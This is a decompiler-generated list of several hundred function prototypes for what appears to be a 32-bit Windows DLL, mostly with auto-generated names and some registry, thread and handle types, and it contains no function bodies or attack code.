// _DWORD *__usercall sub_1000EDE4@<eax>(int *a1@<eax>, _DWORD *a2@<edi>);
void __cdecl __noreturn sub_1000EDF9(int pExceptionObject);
_DWORD *__thiscall sub_1000EE19(_DWORD *this, int a2);
_DWORD *__stdcall sub_1000EE51(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend, int a5, volatile LONG *a6);
void **__thiscall sub_1000EF1B(void **this, char a2);
int __thiscall sub_1000EF7D(int this);
int __thiscall sub_1000EFDD(int this);
int __thiscall sub_1000F056(_DWORD **this);
int __thiscall sub_1000F062(_DWORD **this);
int __thiscall sub_1000F06A(_DWORD **this);
int __thiscall sub_1000F076(_DWORD **this);
int __thiscall sub_1000F07E(_DWORD **this, int a2);
_DWORD *__cdecl sub_1000F0B4(_DWORD *a1, void *a2);
void __thiscall sub_1000F1AC(_BYTE *this);
int __stdcall sub_1000F1B1(int a1, int a2, volatile LONG *lpAddend, int a4, int a5);
int __thiscall sub_1000F290(int this, char a2);
_DWORD *__fastcall sub_1000F2E6(_DWORD *a1, int a2, _DWORD *a3);
void __thiscall sub_1000F355(_DWORD *this, _DWORD *a2, int a3);
void __thiscall sub_1000F39D(_DWORD *this, _DWORD *a2, int a3);
void __thiscall sub_1000F3E5(_DWORD *this, _DWORD *a2, int a3);
void __thiscall sub_1000F42D(_DWORD *this, _DWORD *a2, int a3);
void __thiscall sub_1000F475(_DWORD *this, _DWORD *a2, int a3, int a4);
void __thiscall sub_1000F4E8(_DWORD *this, _DWORD *a2, double a3);
void __thiscall sub_1000F535(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8);
void __thiscall sub_1000F5AB(_DWORD *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_1000F61F(_DWORD *this, _DWORD *a2);
char __thiscall sub_1000F66A(_DWORD *this, _DWORD *a2);
__int16 __thiscall sub_1000F6B5(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000F700(_DWORD *this, _DWORD *a2);
void *__thiscall sub_1000F749(_DWORD *this, void *a2, _DWORD *a3, int a4);
int __thiscall sub_1000F7A3(_DWORD *this, int a2, _DWORD *a3);
void *__thiscall sub_1000F7FA(_DWORD *this, void *a2, _DWORD *a3);
double __thiscall sub_1000F851(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000F89D(_DWORD *this, _DWORD *a2);
char __thiscall sub_1000F8E6(_DWORD *this, _DWORD *a2);
void __thiscall sub_1000F931(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000F976(_DWORD *this, _DWORD *a2, _DWORD *a3);
char __thiscall sub_1000FA4D(int **this);
int __thiscall sub_1000FA58(_DWORD **this);
_DWORD *__thiscall sub_1000FA60(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_1000FB37(int this, _DWORD *a2);
int __stdcall sub_1000FB8B(int a1, void *a2);
_DWORD *__thiscall sub_1000FC33(_DWORD *this, char a2);
int __thiscall sub_1000FC8A(_DWORD **this);
void *__thiscall sub_1000FC92(void *this, void *a2);
void __stdcall sub_1000FCC9(_DWORD *a1, int a2, int a3);
_DWORD *__stdcall sub_1000FD12(_DWORD *a1, int a2);
void __thiscall sub_1000FD78(_DWORD *this);
_DWORD *__thiscall sub_1000FD8A(_DWORD *this, char a2);
int __stdcall sub_1000FDB7(int a1);
void __thiscall sub_1000FDE4(void *this, int a2, int a3);
void __stdcall sub_1000FE28(volatile LONG *a1, volatile LONG *lpAddend, volatile LONG *a3);
void __thiscall sub_1000FE9E(int *this, int a2, int a3);
void __thiscall sub_1000FF0D(int *this, int a2, char a3);
void __thiscall sub_1000FF72(int *this, int a2, char a3);
void __thiscall sub_1000FFD7(int *this, int a2, char a3);
void __thiscall sub_1001003C(int *this, int a2, int a3, int a4);
void __thiscall sub_1001008F(int *this, int a2, char a3, int a4);
void __thiscall sub_100100F4(int *this, int a2, int a3, int a4, int a5, int a6, int a7);
void __thiscall sub_10010147(int *this, int a2, int a3, int a4, int a5, void *Block, int a7, int *a8);
bool __thiscall sub_100101E4(void *this, int a2);
char __thiscall sub_10010231(void *this, int a2);
__int16 __thiscall sub_1001027A(void *this, int a2);
int __thiscall sub_100102C5(void *this, int a2);
int __thiscall sub_1001030E(void *this, int a2, int a3);
_DWORD *__thiscall sub_1001034A(void *this, _DWORD *a2, int a3);
double __thiscall sub_1001039D(void *this, int a2);
void *__thiscall sub_100103E3(int *this, void *a2, int a3, volatile LONG *a4);
int __thiscall sub_10010487(int *this, int a2);
bool __thiscall sub_10010588(int *this, int a2);
_DWORD *__stdcall sub_10010628(int a1, _DWORD *a2, int a3, int a4, void *Block);
_DWORD *__stdcall sub_10010719(int *a1, _DWORD *a2, int a3, int a4, void *Block);
_DWORD *__thiscall sub_100107CC(int *this, _DWORD *a2, int a3);
void __stdcall sub_1001089C(int *a1, int a2, int a3, volatile LONG *lpAddend, LONG *a5);
int __thiscall sub_10010933(int *this, int a2, int Src);
int *__thiscall sub_100109ED(int this, int *a2);
int __thiscall sub_10010A31(int *this, int a2);
_DWORD *__thiscall sub_10010A99(int *this, _DWORD *a2, int a3);
int __thiscall sub_10010B64(int *this);
void __thiscall sub_10010BA3(int *this);
int __thiscall sub_10010C3A(int this);
int *__thiscall sub_10010C52(int *this);
_DWORD *__stdcall sub_10010C8E(_DWORD *a1);
// int __usercall sub_10010CC6@<eax>(_DWORD *a1@<edi>, int a2@<esi>);
// _DWORD *__usercall sub_10010CE9@<eax>(_DWORD *a1@<edi>, _DWORD *a2@<esi>);
void __cdecl __noreturn sub_10010D0C(int a1);
_DWORD *__thiscall sub_10010D38(_DWORD *this, int a2, int a3);
int __stdcall sub_10010DB1(int, int, volatile LONG *lpAddend); // idb
void *__thiscall sub_10010E97(void *Block, char a2);
int __thiscall sub_10010EB7(_DWORD **this);
_DWORD *__thiscall sub_10010EC5(int *this, _DWORD *a2, void *Block);
_DWORD *__thiscall sub_10010F97(int this, _DWORD *a2, void *Block);
int __thiscall sub_1001113A(int *this, int a2);
int __thiscall sub_10011236(int this);
int __thiscall sub_100112C2(_DWORD **this);
_DWORD *__stdcall sub_100112CD(_DWORD *a1, int ArgList);
_DWORD *__thiscall sub_1001131B(_DWORD *this, _DWORD *a2, int ArgList);
int __thiscall sub_100113AD(int *this, unsigned int a2);
// void __usercall sub_10011464(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
// int __usercall sub_10011516@<eax>(_DWORD *a1@<esi>);
_DWORD *__stdcall sub_1001160C(_DWORD *a1, unsigned int a2);
_DWORD *__stdcall sub_10011653(_DWORD *a1);
char *__thiscall sub_100116C3(_DWORD *this, char a2);
void __thiscall sub_100116E5(_DWORD *this);
void *__thiscall sub_1001170B(_BYTE *this);
void __thiscall sub_10011741(_BYTE *this);
unsigned int __thiscall sub_10011746(void *this, _DWORD *a2);
void __cdecl __noreturn sub_100117C0(int a1, int a2);
_DWORD *__thiscall sub_100117E5(_DWORD *this, int a2, int a3);
int __stdcall sub_1001187B(int a1, int a2, int a3);
_BYTE *__thiscall sub_10011923(_BYTE *Block, char a2);
int __stdcall sub_10011942(int, int, volatile LONG *lpAddend); // idb
void *__thiscall sub_100119B4(_BYTE *this);
int __thiscall sub_10011A1B(_DWORD **this, _BYTE *a2);
int __thiscall sub_10011A3E(_DWORD **this, int a2);
int __thiscall sub_10011A59(_DWORD **this);
int __thiscall sub_10011A75(_BYTE *this);
int __thiscall sub_10011A95(_DWORD **this);
int __thiscall sub_10011A9D(void *this, int a2, int a3);
// int __userpurge sub_10011AB3@<eax>(int a1@<eax>, int a2, int a3, int a4);
// _DWORD *__usercall sub_10011AE0@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
// int __userpurge sub_10011AF4@<eax>(int a1@<esi>, void *a2, char a3, BOOL a4, DWORD a5, DWORD a6);
// _DWORD *__usercall sub_10011B1D@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
char __stdcall sub_10011B71(int a1);
// _DWORD *__usercall sub_10011BB7@<eax>(_DWORD *a1@<esi>);
// _DWORD *__usercall sub_10011BCF@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
void __cdecl sub_10011C23(HANDLE hSourceHandle, BOOL bInheritHandle, DWORD dwProcessId);
_DWORD *__thiscall sub_10011D61(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10011D80(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10011D9F(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10011DBE(_DWORD *Block, char a2);
char __thiscall sub_10011DDD(_DWORD *this);
bool __thiscall sub_10011E1D(_DWORD *this);
// char __usercall sub_10011E5C@<al>(int a1@<ecx>, int a2@<edi>);
bool __thiscall sub_10011EA5(_DWORD *this);
bool __thiscall sub_10011EE4(_DWORD *this);
// char __userpurge sub_10011F23@<al>(int a1@<ecx>, int a2@<edi>, char a3);
// char __usercall sub_10011F8F@<al>(int a1@<esi>);
// bool __usercall sub_10011FAC@<al>(int a1@<esi>);
// bool __usercall sub_10011FCD@<al>(int a1@<esi>);
// bool __usercall sub_10011FED@<al>(int a1@<esi>);
// _DWORD *__usercall sub_1001200D@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_10012057(_DWORD *Block, char a2);
void __thiscall sub_10012076(_DWORD *this);
int sub_100120B4();
char *__thiscall sub_10012103(char *this);
void __thiscall sub_1001211A(char *this);
void __cdecl __noreturn sub_10012178(int a1, int a2);
_DWORD *__thiscall sub_1001219A(_DWORD *this, int a2);
char *__thiscall sub_100121DB(char *Block, char a2);
int __thiscall sub_10012225(_DWORD *this, int a2);
void *__thiscall sub_1001227F(void *Block, char a2);
void *__thiscall sub_1001229E(int this);
int __thiscall sub_10012326(int *this, _BYTE *a2);
size_t __thiscall sub_10012356(_DWORD *this, _DWORD *a2);
unsigned int __thiscall sub_100123C9(int *this, char a2);
int __thiscall sub_10012404(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001245B(_DWORD *this, int a2);
int __thiscall sub_10012498(_DWORD *this);
int __thiscall sub_1001249F(_DWORD *this, int a2, int a3);
void __thiscall sub_10012502(_DWORD *this, void *a2);
void __cdecl __noreturn sub_10012582(int a1, int a2);
char sub_100125A6();
int __thiscall sub_100125AE(_DWORD *this, int a2, int a3);
void *__thiscall sub_100125B6(char *this, char a2);
int __thiscall sub_100125BE(_DWORD *this);
_DWORD *__stdcall sub_100125C6(_DWORD *a1, void *a2, char a3);
void __stdcall sub_100125FD(int *a1);
_DWORD *__stdcall sub_10012621(_DWORD *a1, void *a2, char a3);
int *__thiscall sub_1001265A(int *Block, char a2);
void __thiscall sub_10012679(int *this);
DWORD __thiscall sub_100126A3(_DWORD *this);
char __thiscall sub_100126F0(_DWORD *this, DWORD dwExitCode);
int __stdcall sub_1001274E(int, void *); // idb
int __thiscall sub_10012814(_DWORD *this);
bool __thiscall sub_10012837(_DWORD *this);
_DWORD *__thiscall sub_10012882(void *this, _DWORD *a2, DWORD a3);
void __stdcall sub_100128CB(int *a1);
__int64 __thiscall sub_100128EF(_DWORD *this);
DWORD __thiscall sub_10012974(_DWORD *this);
// _DWORD *__usercall sub_100129B6@<eax>(DWORD a1@<ebx>, _DWORD *a2);
// _DWORD *__userpurge sub_10012A1E@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__userpurge sub_10012A51@<eax>(int a1@<edi>, _DWORD *a2);
_DWORD *__stdcall sub_10012A85(_DWORD *a1, int a2);
int *__thiscall sub_10012AC0(int *Block, char a2);
_DWORD *__thiscall sub_10012ADF(_DWORD *this, _DWORD *a2, char a3, DWORD DesiredAccess);
LPCONTEXT __thiscall sub_10012B5A(_DWORD *this, LPCONTEXT lpContext);
int __thiscall sub_10012BE9(_DWORD *this);
int __thiscall sub_10012C43(_DWORD *this);
LONG __stdcall sub_10012C9D(int *a1);
// LONG __usercall sub_10012CDF@<eax>(int *a1@<esi>);
int __stdcall sub_10012D33(int a1, void *a2, char a3);
_DWORD *__thiscall sub_10012D82(_DWORD *Block, char a2);
int __stdcall sub_10012DA1(int a1, int a2);
bool __thiscall sub_10012DF5(_DWORD *this);
_DWORD *__stdcall sub_10012E21(_DWORD *a1, void *a2, char a3);
void __thiscall sub_10012E7E(int *this);
void __stdcall sub_10012EAB(int a1, int a2, char pExceptionObject);
BOOL __thiscall sub_10012F17(_DWORD *this);
void __thiscall sub_10012F22(int *this, void *a2, int a3);
int __thiscall sub_10012FB6(int *this);
bool __stdcall sub_1001303A(int a1);
// int *__usercall sub_100130E8@<eax>(int *a1@<eax>, int *a2@<edi>);
_DWORD *__thiscall sub_1001310B(_DWORD *Block, char a2);
void __thiscall sub_1001312A(_DWORD *this);
_BYTE *__thiscall sub_10013181(_BYTE *this, int a2);
LPVOID sub_1001319F();
int __stdcall sub_100131B5(int a1);
int *__thiscall sub_10013225(int *Block, char a2);
void __stdcall pfnAPC(ULONG_PTR Parameter); // idb
void *__thiscall sub_1001329C(int this, int a2);
int __thiscall sub_10013406(unsigned int *this);
int __thiscall sub_100134FD(int *this);
void __thiscall sub_10013553(int *this);
int __thiscall sub_100135CE(_DWORD *this);
int __thiscall sub_100135D2(_DWORD *this);
int __thiscall sub_1001360D(_DWORD *this);
int __thiscall sub_1001364B(int *this);
char __thiscall sub_100136F6(int *this);
void __thiscall sub_100137BD(int *this, int a2, char a3);
void *__thiscall sub_10013882(int this, DWORD dwExitCode);
void *__thiscall sub_10013931(_DWORD *this, int a2);
void *__thiscall sub_100139F2(_DWORD *this);
unsigned int __stdcall StartAddress(int *lpTlsValue);
_DWORD *__thiscall sub_10013C34(void *this, _DWORD *a2, _DWORD *a3);
int __thiscall sub_10013CBE(int this);
void __thiscall sub_10013CEC(_DWORD *this);
BOOL __thiscall sub_10013CF0(_DWORD *this);
void *__thiscall sub_10013CFA(int this);
int __thiscall sub_10013D58(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_10013DBB(_DWORD *this, unsigned int a2);
int __thiscall sub_10013E07(_DWORD *this, int a2);
int __thiscall sub_10013E28(_DWORD *this, int a2);
void __thiscall sub_10013E49(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10013E6E(_DWORD *this, unsigned int a2, int a3, int a4);
void **__thiscall sub_10013EE0(void **this, void **a2);
void *__thiscall sub_10013F22(int this);
int __thiscall sub_10013F80(_DWORD *this, char *a2, unsigned int a3);
int __thiscall sub_10013FE2(_DWORD *this, unsigned int a2);
int __thiscall sub_1001402D(_DWORD *this, int a2);
int __thiscall sub_1001404B(_DWORD *this, int a2);
int __thiscall sub_10014069(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_100140AB(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __stdcall sub_1001411E(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_10014131(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_10014181(_DWORD *this);
void *__thiscall sub_1001422D(_DWORD *this);
int __thiscall sub_10014277(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_100142CF(_DWORD *this, _DWORD *a2);
void *__thiscall sub_10014334(_DWORD *this);
BOOL __thiscall sub_10014360(_DWORD *this, int a2);
int __thiscall sub_1001438C(_DWORD *this, int a2);
int __thiscall sub_100143C2(_DWORD *this, int a2);
int __thiscall sub_100143F8(_DWORD *this);
int __thiscall sub_10014404(_DWORD *this);
int __thiscall sub_1001440C(_DWORD *this);
void *__thiscall sub_10014414(void *Block, char a2);
void *__thiscall sub_10014433(void *Block, char a2);
_DWORD *__thiscall sub_10014452(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10014471(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_10014490@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_100144E2(_DWORD *a1);
_DWORD *__stdcall sub_10014563(_DWORD *a1);
_DWORD *__stdcall sub_100145B3(_DWORD *a1, int a2);
int __thiscall sub_10014635(_DWORD *this);
int __thiscall sub_1001468F(_DWORD *this);
_DWORD *__stdcall sub_100146C0(_DWORD *a1);
_DWORD *__stdcall sub_10014724(_DWORD *a1);
int __thiscall sub_10014782(void *this);
BOOL sub_100147C4();
void *sub_100147E7();
// char __usercall sub_10014857@<al>(_DWORD *a1@<esi>);
// char __usercall sub_1001488C@<al>(_DWORD *a1@<eax>, _DWORD *a2@<ecx>, _DWORD *a3@<edi>);
// char __usercall sub_10014A32@<al>(_DWORD *a1@<ebx>);
// bool __usercall sub_10014AF7@<al>(int a1@<eax>);
DWORD __thiscall sub_10014B0E(_DWORD *this);
int sub_10014BAB();
bool __cdecl sub_10014C6C(int a1);
_DWORD *__cdecl sub_10014D59(_DWORD *a1);
_DWORD *__cdecl sub_10014DE5(_DWORD *a1);
_DWORD *__cdecl sub_10014E71(_DWORD *a1);
_DWORD *__cdecl sub_10014EFD(_DWORD *a1);
_DWORD *__cdecl sub_10014F89(_DWORD *a1, int a2, int a3, int a4, int a5);
_DWORD *__cdecl sub_10015017(_DWORD *a1);
LONG *__thiscall sub_10015079(LONG *this);
void __cdecl __noreturn sub_100150F2(_DWORD *a1, int a2);
int *__stdcall sub_10015117(int a1, int a2, HANDLE hToken);
LPVOID *__thiscall sub_1001517D(LPVOID *Block, char a2);
BOOL __thiscall sub_1001519C(LPVOID *this);
LONG *__cdecl sub_100151DD(LONG *a1, int a2);
void __cdecl __noreturn sub_10015338(int a1, int a2);
void *__thiscall sub_1001535A(void *this, int a2);
void *__stdcall sub_10015644(int a1);
int __cdecl sub_10015668(int a1);
_DWORD *sub_10015734();
_DWORD *__thiscall sub_100157AA(void *this, _DWORD *a2);
_DWORD *__stdcall sub_10015814(_DWORD *a1);
void *__thiscall sub_1001584F(int this);
int __thiscall sub_100158AD(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_10015925(int *this, int a2);
int __thiscall sub_10015940(_DWORD *this, unsigned int a2);
int __thiscall sub_10015997(_DWORD *this, int a2);
int __thiscall sub_100159B8(_DWORD *this, int a2);
int __thiscall sub_100159D9(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10015A20(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10015A92(void *this, unsigned int a2, int a3);
unsigned int __thiscall sub_10015ACC(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_10015B39(void *Block, char a2);
// void *__usercall sub_10015B58@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
_DWORD *__thiscall sub_10015B78(_DWORD *Block, char a2);
BOOL __thiscall sub_10015B97(_DWORD *this);
void __noreturn sub_10015BF6(void); // weak
int sub_10015C1C();
void __noreturn sub_10015C59(void); // weak
_DWORD *__stdcall sub_10015C83(_DWORD *a1, char a2, int a3);
_DWORD *__stdcall sub_10015CC2(_DWORD *a1);
_DWORD *__stdcall sub_10015CF9(_DWORD *a1, char a2);
_DWORD *__thiscall sub_10015D31(_DWORD *Block, char a2);
void __thiscall sub_10015D50(_DWORD *this);
// _DWORD *__userpurge sub_10015D79@<eax>(int a1@<edi>, _DWORD *a2);
_DWORD *__thiscall sub_10015DB2(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10015DFC(void *Block, char a2);
void *__thiscall sub_10015E1B(int this);
int __thiscall sub_10015E82(void *this, _BYTE *a2);
int __thiscall sub_10015EAE(_DWORD **this, int a2);
int __thiscall sub_10015F58(_DWORD **this, int a2, int a3);
int __thiscall sub_10015F92(_DWORD **this);
_DWORD *__thiscall sub_10015F9A(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10015FF8(void *Block, char a2);
int __thiscall sub_10016017(int this);
int __thiscall sub_1001608A(char *this, char a2);
unsigned int __thiscall sub_100160B0(_DWORD *this, _DWORD *a2);
int __thiscall sub_1001615E(_DWORD **this, int a2, int a3);
_DWORD *__thiscall sub_10016198(_DWORD *this, _DWORD *a2);
int *__thiscall sub_100161E7(int *Block, char a2);
// int __usercall sub_10016206@<eax>(int a1@<esi>, int a2);
void __thiscall sub_10016267(int *this);
int __thiscall sub_100162AA(void *this, int a2, int a3);
int __thiscall sub_100162C0(_DWORD *this, int a2, int a3);
int __stdcall sub_100162DB(_DWORD *a1, int a2, _DWORD *a3);
_DWORD __stdcall nullsub_3(_DWORD); // weak
char sub_1001635B();
int *__thiscall sub_10016363(int *this, char a2);
int __thiscall sub_1001636B(char *this);
int __stdcall sub_10016373(int a1);
int __thiscall sub_1001637B(void *this);
void __thiscall sub_10016386(_DWORD *this, int a2, volatile LONG *lpAddend);
int __thiscall sub_100165A0(void *this, int a2);
void __thiscall sub_1001666A(_DWORD *this);
char *__thiscall sub_1001669A(_DWORD *this, char a2);
void __stdcall sub_100166BC(int *a1, int a2);
_DWORD *__thiscall sub_1001674C(void *this, _DWORD *a2, unsigned int a3);
int *__stdcall sub_10016793(int *a1, int a2, int a3, char *a4, int a5);
int __stdcall sub_1001684C(int a1, int a2);
void *__thiscall sub_100168F0(void *Block, char a2);
void __thiscall sub_1001690F(int this);
void __thiscall sub_10016995(void *this);
void __stdcall sub_100169D9(int a1);
void __stdcall sub_10016A00(int a1);
_DWORD *__stdcall sub_10016A27(int a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8);
_DWORD *__thiscall sub_10016ACA(int this, _DWORD *a2, unsigned int a3);
// void __userpurge sub_10016B71(char *a1@<ecx>, char *a2@<ebx>, int a3@<esi>, int a4, char *a5, int a6, int *a7);
void __fastcall sub_10016BEF(char *a1, char *a2, void *a3);
// unsigned int __usercall sub_10016CEA@<eax>(unsigned int a1@<ecx>, _DWORD **a2@<ebx>);
_DWORD *__stdcall sub_10016E5C(_DWORD *a1);
void __stdcall sub_10016EB9(int a1, _DWORD *a2, int a3);
void __thiscall sub_10016EF8(int *this, int a2, volatile LONG *lpAddend);
int __stdcall sub_10016FB9(int *a1, unsigned int a2);
void __thiscall sub_10017033(int *this, _DWORD *a2, volatile LONG *lpAddend);
char __thiscall sub_100170C0(int this);
int __thiscall sub_10017128(int this);
void *__stdcall sub_10017180(int a1, void *a2);
void __cdecl __noreturn sub_100171B9(int a1, int a2);
_DWORD *__thiscall sub_100171DD(_DWORD *this, int a2, int a3);
_DWORD *__stdcall sub_10017256(_DWORD *a1, LPCWSTR lpName, int a3, int a4);
_DWORD *__thiscall sub_100172B4(_DWORD *Block, char a2);
bool __thiscall sub_100172D3(_DWORD *this);
void __thiscall sub_100172FF(int *this);
_DWORD *__stdcall sub_10017325(_DWORD *a1, int a2, int a3, volatile LONG *lpAddend, int a5);
int __thiscall sub_10017420(int this, char a2);
_DWORD *__thiscall sub_10017466(void *this, _DWORD *a2, void *a3, int a4, int a5, void *Block, _DWORD *a7);
void __thiscall sub_100175D1(_DWORD *this, _DWORD *a2);
void __stdcall sub_1001769D(_DWORD *a1, int Src);
int __thiscall sub_1001773F(int this);
int *__cdecl sub_1001778D(int *a1, void *a2);
_DWORD *__stdcall sub_1001795F(_DWORD *a1, void *Block, int a3, volatile LONG *lpAddend);
_DWORD *__stdcall sub_10017A30(int a1, _DWORD *a2);
void __stdcall sub_10017A74(_DWORD *a1, int a2);
int *__thiscall sub_10017B34(_DWORD *this, int *a2, int a3, void *a4);
// _DWORD *__usercall sub_10017C13@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10017C5F(_DWORD *a1, int a2, int a3, int a4);
int *__thiscall sub_10017CC4(int *this, char a2);
_DWORD *__stdcall sub_10017D0A(_DWORD *a1, _DWORD *a2, int a3, int a4);
_DWORD *__stdcall sub_10017D89(_DWORD *a1, _DWORD *a2, int a3, int a4);
_DWORD *__thiscall sub_10017E09(_DWORD *this, _DWORD *a2, int a3, int a4, unsigned int a5);
bool __thiscall sub_10017FA9(_DWORD *this, int a2, int a3, int a4);
int __thiscall sub_10017FFF(_DWORD *this, int a2);
void __thiscall sub_10018035(_DWORD *this, int a2, int *a3, unsigned int a4);
int __thiscall sub_10018293(_DWORD *this);
int __thiscall sub_10018316(_DWORD *this, int a2, unsigned int a3);
int sub_10018494();
int __thiscall sub_10018498(int this, int a2);
_DWORD *__thiscall sub_100184CE(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10018549(void *this, _DWORD *a2);
void *__thiscall sub_100185A9(_DWORD *this);
int __thiscall sub_100185CD(void *this, int a2);
_DWORD *__stdcall sub_10018600(_DWORD *a1, int a2);
BOOL __thiscall sub_10018662(int this);
LONG *__thiscall sub_10018675(LONG *this);
void __thiscall sub_100186B0(_DWORD *this);
void __thiscall sub_100186B4(int *this);
int *__thiscall sub_100186F0(int *this, char a2);
int *__thiscall sub_1001872B(int *Block, char a2);
int *__thiscall sub_1001874A(int *this, int *a2);
void *__thiscall sub_1001878F(_DWORD *this);
int __thiscall sub_100187F0(_DWORD *this);
void __thiscall sub_100187F4(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_10018891(_DWORD *this, unsigned int a2);
int __thiscall sub_100188EB(_DWORD *this, int a2);
int __thiscall sub_1001890C(_DWORD *this, int a2);
char *__thiscall sub_1001892D(_DWORD *this, char *a2);
int __thiscall sub_10018956(int *this);
int __thiscall sub_1001897D(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_100189C2(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10018A34(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_10018AE4(_DWORD *this);
_DWORD *__stdcall sub_10018BFA(_DWORD *a1);
void *__thiscall sub_10018C67(_DWORD *this);
bool __thiscall sub_10018CB1(_DWORD *this, int a2);
char __thiscall sub_10018CF0(_DWORD *this, int a2);
int __thiscall sub_10018D44(_DWORD *this, int a2);
int __thiscall sub_10018DC8(_DWORD *this, int a2);
void __thiscall sub_10018E34(void *this, int a2, int *a3);
_DWORD *__thiscall sub_10018E8A(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10018EC2(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10018F27(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10018F5A(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10018F8D(_DWORD *Block, char a2);
void __thiscall sub_10018FAC(_DWORD *this);
_DWORD *__thiscall sub_10018FB6(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10018FD5(_DWORD *a1, unsigned int a2);
// int __userpurge sub_1001901E@<eax>(_DWORD *a1@<edi>, int a2);
_DWORD *__thiscall sub_100190A5(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100190E5(int *this, _DWORD *a2);
// void __usercall sub_10019125(_DWORD *a1@<edi>, int a2@<esi>);
_DWORD *__stdcall sub_10019192(_DWORD *a1, void *a2, int a3);
// _DWORD *__userpurge sub_100191D6@<eax>(_DWORD *a1@<ebx>, _DWORD *a2, int a3);
void *__thiscall sub_10019215(void *this, _DWORD *a2);
// int __usercall sub_1001936C@<eax>(void *a1@<ecx>, _DWORD *a2@<edi>);
// int __usercall sub_10019445@<eax>(int a1@<esi>);
// int __usercall sub_10019459@<eax>(_DWORD *a1@<ecx>, int a2@<esi>);
void __thiscall sub_100194A1(void **this);
void **__thiscall sub_100194E7(void **Block, char a2);
int sub_10019506();
_DWORD *__thiscall sub_100195B0(_DWORD *Block, char a2);
char __thiscall sub_100195D0(void *this, int a2, char a3);
HKEY __stdcall sub_10019736(HKEY a1, int a2, char a3);
HKEY __cdecl sub_1001984B(HKEY hKey);
void __thiscall sub_100198C2(HKEY phkResult, int a2);
char __thiscall sub_10019A24(HKEY phkResult, int a2);
_DWORD *__thiscall sub_10019B05(HKEY this, _DWORD *a2, int a3, DWORD dwIndex, char a5);
DWORD __thiscall sub_10019BD4(HKEY this, int a2, char a3);
int __thiscall sub_10019CA4(HKEY this, int a2);
_DWORD *__thiscall sub_10019D77(HKEY this, _DWORD *a2, LSTATUS a3);
char __thiscall sub_10019EAF(HKEY this, int a2, int a3, int a4);
_DWORD *__thiscall sub_10019F8F(HKEY this, _DWORD *a2, int a3, int a4, DWORD *a5, LSTATUS a6);
char __thiscall sub_1001A0D2(HKEY this, int a2, int a3, _DWORD *a4, DWORD dwType);
char __thiscall sub_1001A187(HKEY this, int a2, int a3);
_DWORD *__thiscall sub_1001A268(HKEY this, _DWORD *a2, int a3, DWORD dwIndex, char a5);
DWORD __thiscall sub_1001A34A(HKEY this, int a2, char a3);
int __thiscall sub_1001A415(void *this, int a2, HKEY phkResult, char a4);
HKEY __thiscall sub_1001A566(void *this, HKEY phkResult, int a3);
HKEY __stdcall sub_1001A5CA(HKEY phkResult, int a2, char a3);
_DWORD *__stdcall sub_1001A70D(_DWORD *a1, int a2);
void __cdecl __noreturn sub_1001A8CA(int pExceptionObject);
void __cdecl __noreturn sub_1001A8EA(int pExceptionObject);
void __cdecl __noreturn sub_1001A90A(int pExceptionObject);
void __cdecl __noreturn sub_1001A92A(int pExceptionObject);
_DWORD *__thiscall sub_1001A94A(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1001A969(void *this, _DWORD *a2, char a3);
void *__thiscall sub_1001A9AF(void *Block, char a2);
int __thiscall sub_1001A9CE(int this);
void *__thiscall sub_1001AA35(void *this, int a2);
_DWORD *__thiscall sub_1001AA4A(_DWORD *this, char a2);
void *__thiscall sub_1001AA66(void *this, char a2);
void *__thiscall sub_1001AA80(void *this, char a2);
void *__thiscall sub_1001AA9A(void *this, char a2, int a3);
void *__thiscall sub_1001AAB4(void *this, int a2, int a3);
void *__thiscall sub_1001AB12(void *this, int a2, int a3, int a4, int a5, int a6);
void __thiscall sub_1001AB5A(_DWORD *this, unsigned __int8 *Source, rsize_t SourceSize);
int __stdcall sub_1001AC1E(int a1);
void *__thiscall sub_1001AC6A(void *Block, char a2);
int __thiscall sub_1001AC89(int this);
